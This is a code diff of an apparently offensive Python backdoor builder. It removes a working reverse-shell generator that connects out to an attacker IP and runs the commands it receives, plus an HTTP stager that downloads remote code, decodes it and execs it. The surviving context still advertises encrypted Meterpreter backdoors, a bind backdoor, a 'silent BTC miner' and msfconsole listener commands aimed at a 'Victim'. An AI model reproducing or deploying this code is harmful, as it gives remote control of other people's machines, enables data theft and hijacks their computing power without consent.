@@ -67,7 +67,6 @@ def logo():
           ▐      ▐     ▐   █       █ █         █          █    ▐   ▐     ▐   
                            ▐       ▐ ▐         ▐          ▐                  
 
-
     '''
     logo3 = '''
                                                                              
@@ -85,9 +84,7 @@ def logo():
         :   : :-' ;   |.' |   | :               \   \ .'    `--'---' |   : / \  \  ; 
         |   |.'   '---'   `---'.|                `---`               ;   |/   \  ' | 
         `---'               `---`                                    `---'     `--`  
-                                                                             
-
-    
+                                                                                
     '''
     logo4 = '''
                       .=-.-.   _ __              _,.---._      ,-,--.          ,-.--, 
@@ -100,25 +97,9 @@ def logo():
         /==/  /\ ,  )==/. /==/ - |             '.='. -   .' \==\ - , /\==\- \/=/ , /  
         `--`-`--`--'`--`-``--`---'               `--`--''    `--`---'  `--`-'  `--`   
 
-
     '''
 
-    logo5 = '''
 
-
-        █████▒█    ██  ▄████▄   ██ ▄█▀    ▄▄▄    ██▒   █▓
-        ▓██   ▒ ██  ▓██▒▒██▀ ▀█   ██▄█▒    ▒████▄ ▓██░   █▒
-        ▒████ ░▓██  ▒██░▒▓█    ▄ ▓███▄░    ▒██  ▀█▄▓██  █▒░
-        ░▓█▒  ░▓▓█  ░██░▒▓▓▄ ▄██▒▓██ █▄    ░██▄▄▄▄██▒██ █░░
-        ░▒█░   ▒▒█████▓ ▒ ▓███▀ ░▒██▒ █▄    ▓█   ▓██▒▒▀█░  
-        ▒ ░   ░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░▒ ▒▒ ▓▒    ▒▒   ▓▒█░░ ▐░  
-        ░     ░░▒░ ░ ░   ░  ▒   ░ ░▒ ▒░     ▒   ▒▒ ░░ ░░  
-        ░ ░    ░░░ ░ ░ ░        ░ ░░ ░      ░   ▒     ░░  
-                ░     ░ ░      ░  ░            ░  ░   ░  
-                        ░                              ░   
-
-
-    '''
 
     logo6 = '''
     
@@ -143,7 +124,6 @@ def logo():
    ░   ░ ░  ▒ ░░ ░   ░  ░  ░░ ░  ░      ░      ░     ░   ▒     ░░   ░    ░   
          ░  ░        ░  ░  ░  ░                ░         ░  ░   ░        ░  ░
                                                                              
-
     '''
 
     logo7 = '''
@@ -159,10 +139,8 @@ def logo():
      ░ ░     ░░   ░    ░      ░        ░   ▒   ░  ░  ░  ░  ░  ░    ░   ▒      ░   ░ ░ ░ ░   ░    ░   
               ░        ░  ░   ░  ░         ░  ░      ░        ░        ░  ░         ░       ░    ░  ░
                                                                                                  
-
-
     '''
-    logolist = [logo1, logo2, logo3, logo4, logo5, logo6, logo7]
+    logolist = [logo1, logo2, logo3, logo4, logo6, logo7]
     print(random.choice(logolist))
 clear = lambda: os.system('clear')
 clear()
@@ -252,102 +230,6 @@ main()
         ina.close
         print('(*) Generated Backdoor and saved as '+name)
         print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/bind_tcp')
-def gen_rev():
-    global name
-    global host
-    global port
-    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
-    host = input('Please enter the ip you wish the backdoor to connect back to: ')
-    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
-    with open(name, 'a+') as ina:
-        ina.write('port = '+str(port)+'\n')
-        ina.write("\n")
-        ina.write('hototo = "'+str(host)+'"')
-        b = '''
-import socket
-import os
-import subprocess
-import sys
-import time
-SERVER_HOST = hototo
-SERVER_PORT = port
-BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
-# separator string for sending 2 messages in one go
-SEPARATOR = "<sep>"
-def main():
-    try:
-        # create the socket object
-        s = socket.socket()
-        # connect to the server
-        s.connect((SERVER_HOST, SERVER_PORT))
-        # get the current directory
-        cwd = os.getcwd()
-        s.send(cwd.encode())
-
-        while True:
-            # receive the command from the server
-            command = s.recv(BUFFER_SIZE).decode()
-            splited_command = command.split()
-            if command.lower() == "exit":
-                break
-            if splited_command[0].lower() == "cd":
-                try:
-                    os.chdir(' '.join(splited_command[1:]))
-                except FileNotFoundError as e:
-                    output = str(e)
-                else:
-                    # if operation is successful, empty message
-                    output = ""
-            else:
-                # execute the command and retrieve the results
-                output = subprocess.getoutput(command)
-            # get the current working directory as output
-            cwd = os.getcwd()
-            # send the results back to the server
-            message = f"{output}{SEPARATOR}{cwd}"
-            s.send(message.encode())
-        # close client connection
-        s.close()
-    except Exception:
-        time.sleep(10)
-        main()
-main()
-                    '''
-        ina.write(b)
-        ina.close
-        print('(*) Generated Backdoor and saved as '+name)
-        print('To open a listener you can run this command "ncat -lvnp '+port+'"')
-def gen_rev_http():
-    global name
-    global host
-    global port
-    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
-    host = input('Please enter the ip you wish the backdoor to connect back to: ')
-    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
-    with open(name, 'a+') as ina:
-        ina.write('port = str('+str(port)+")")
-        ina.write("\n")
-        ina.write('hototo = "'+str(host)+'"')
-        a = '''
-import zlib,base64,sys,time
-def main():
-    try:
-        vi=sys.version_info
-        ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener'])
-        hs=[]
-        o=ul.build_opener(*hs)
-        o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
-        url = str("http://"+hototo+":"+port)
-        exec(zlib.decompress(base64.b64decode(o.open(url+"/JALArVzOfB9_empuHWat8Az6GgFl8XzRNDQgjDZ-QsXX5ZRs4sWBMJUulKjhIghyXoqErAHsyIMqqR7Jr-qEaXKGr4ZNHLh4AkSO9ZooGjio7P4t6_-OIGMT_J35i3wKYoQ3ut4N8TiHvNPlBwb1e86d6o5_CsVR-dfthze7KLyeNggMgvtH1GP0zy5QrGH").read())))
-    except Exception:
-        time.sleep(10)
-        main()
-main()                
-'''
-        ina.write(a)
-        ina.close
-        print('(*) Generated Backdoor and saved as '+name)
-        print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/reverse_http')  
 def gen_rev_ssl_tcp():
     global name
     global host
@@ -648,14 +530,12 @@ def cleanup():
 print("""
     
         1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
-        2. Create Reverse Shell (TCP (experminetal))
-        3. Create Reverse Meterpreter (HTTP)
-        4. Create Encrypted TCP Meterpreter (can embed in other script) (recommended)
-        5. Open a listener
+        2. Create Encrypted TCP Meterpreter (can embed in other script) (recommended)
+
         ##########################################################################################
                                                 Miners
                                     BTC POOL: https://solo.ckpool.org/
-        6. Create a silent BTC miner
+        3. Create a silent BTC miner
         
 
 """)  
@@ -670,29 +550,6 @@ if nscan == "1":
     a = "use python/meterpreter/bind_tcp in metasploit to connect to target"
     print(a)
 if nscan == "2":
-    gen_rev()
-    postgen()
-    rep_syst()
-    cleanup()
-if nscan == "3":
-    gen_rev_http()
-    postgen()
-    rep_syst()
-    cleanup()
-    os.system('clear')
-    if reps == True:
-        print('Generated in dist')
-        print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
-        print('After that the listener will spawn instantly')
-        server()
-        print('wait...')
-        a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
-        os.system(a)
-    else:
-        print('wait...')
-        a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
-        os.system(a)
-if nscan == "4":
     gen_rev_ssl_tcp()
     postgen()
     rep_syst()
@@ -709,14 +566,8 @@ if nscan == "4":
         print('wait...')
         a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
         os.system(a)
-if nscan == '5':
-    disable_defender = False
-    #opt_mods = input('Do you want me to disable Windows Defender as soon as you connect? (y/n): ')
-    #if opt_mods == 'y':
-    #    disable_defender = True
-    port = int(input('Please enter the port u want to listen on: '))
-    listen('0.0.0.0', port)
-if nscan == '6':
+
+if nscan == '3':
     gen_btc_miner()
     opt_obf = input('Do you want to obfuscate the generated programm (recommended) (y/n): ')
     encrypted = False
